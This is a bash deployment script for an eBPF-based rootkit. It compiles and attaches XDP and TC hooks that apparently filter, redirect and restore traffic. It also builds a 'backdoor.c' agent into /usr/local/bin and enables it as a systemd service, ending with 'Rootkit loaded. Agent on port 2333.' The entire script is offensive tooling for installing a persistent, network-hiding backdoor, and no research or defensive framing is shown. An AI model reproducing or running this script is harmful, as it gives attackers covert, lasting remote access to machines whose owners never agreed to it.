#!/bin/bash
set -e

# Detect network interface
IFACE=$(ip route | grep default | awk '{print $5}' | head -n1)

#Install dependencies (quietly)
apt-get update -qq && apt-get install -yq clang llvm libbpf-dev gcc make

#Cleanup old artifacts, hooks, and pinned maps
rm -f ../traffic_handler/*.o ./rkit-agent
systemctl stop rkit 2>/dev/null || true
ip link set dev $IFACE xdp off 2>/dev/null || true
tc qdisc del dev $IFACE clsact 2>/dev/null || true
rm -rf /sys/fs/bpf/tc/globals/* 2>/dev/null || true

#Compile eBPF programs
C_FLAGS="-O2 -g -target bpf"
clang $C_FLAGS -c ../traffic_handler/ip_check.c -o ../traffic_handler/ip_check.o
clang $C_FLAGS -c ../traffic_handler/ingress_redirect.c -o ../traffic_handler/ingress_redirect.o
clang $C_FLAGS -c ../traffic_handler/egress_restore.c -o ../traffic_handler/egress_restore.o

#Load eBPF hooks (XDP & TC)
ip link set dev $IFACE xdp obj ../traffic_handler/ip_check.o sec xdp
tc qdisc add dev $IFACE clsact
tc filter add dev $IFACE ingress bpf da obj ../traffic_handler/ingress_redirect.o sec tc
tc filter add dev $IFACE egress bpf da obj ../traffic_handler/egress_restore.o sec tc

#Compile and Install Agent
gcc backdoor.c -o /usr/local/bin/rkit-agent
chmod +x /usr/local/bin/rkit-agent

# Setup Persistence (Systemd)
cp rkit.service /etc/systemd/system/
systemctl daemon-reload
systemctl enable --now rkit

echo "Rootkit loaded. Agent on port 2333."
